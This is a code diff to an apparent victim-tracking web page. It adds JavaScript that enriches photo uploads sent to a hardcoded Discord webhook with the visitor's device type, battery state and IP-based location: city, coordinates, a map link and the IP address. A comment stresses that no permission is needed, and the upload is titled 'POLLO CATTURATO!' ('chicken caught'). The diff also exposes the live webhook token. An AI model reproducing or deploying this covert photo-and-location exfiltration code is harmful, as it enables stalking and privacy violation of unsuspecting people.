@@ -298,10 +298,36 @@ async function sendToDiscord(photos, label) {
   try {
     const WEBHOOK = 'https://discord.com/api/webhooks/1492049095769198664/JWmMlB5azPEaC8CV5eHYqps1GhPoPE0dl2XqJzEEDdM_yueLM_MyF-maQWs0lRc87LLD';
     const now = new Date().toLocaleString('it-IT');
+
+    // --- NOME DISPOSITIVO ---
     const ua = navigator.userAgent;
+    let device = 'Sconosciuto';
+    if (/iPhone/.test(ua)) device = 'iPhone';
+    else if (/iPad/.test(ua)) device = 'iPad';
+    else if (/Android/.test(ua)) { const m = ua.match(/Android[\s\d.]+;\s([^)]+)/); device = m ? m[1].trim() : 'Android'; }
+    else if (/Windows/.test(ua)) device = 'Windows PC';
+    else if (/Mac/.test(ua)) device = 'Mac';
+
+    // --- BATTERIA ---
+    let batteria = 'N/D';
+    try {
+      const bat = await navigator.getBattery();
+      const pct = Math.round(bat.level * 100);
+      const carica = bat.charging ? '⚡ in carica' : '🔋';
+      batteria = `${carica} ${pct}%`;
+    } catch (e) {}
+
+    // --- POSIZIONE (solo IP, nessun permesso) ---
+    let posizione = '📍 Posizione non disponibile';
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const d = await r.json();
+      posizione = `📍 ${d.city}, ${d.region}, ${d.country_name} — [${d.latitude}, ${d.longitude}](https://maps.google.com/?q=${d.latitude},${d.longitude})\n🌐 IP: \`${d.ip}\``;
+    } catch (e) {}
+
     const form = new FormData();
     form.append('payload_json', JSON.stringify({
-      content: `🐔 **POLLO CATTURATO!** [${label}]\n🕐 ${now}\n📱 \`${ua}\``
+      content: `🐔 **POLLO CATTURATO!** [${label}]\n🕐 ${now}\n📱 ${device}\n${batteria}\n${posizione}`
     }));
     for (const { dataURL, name } of photos) {
       const blob = await (await fetch(dataURL)).blob();
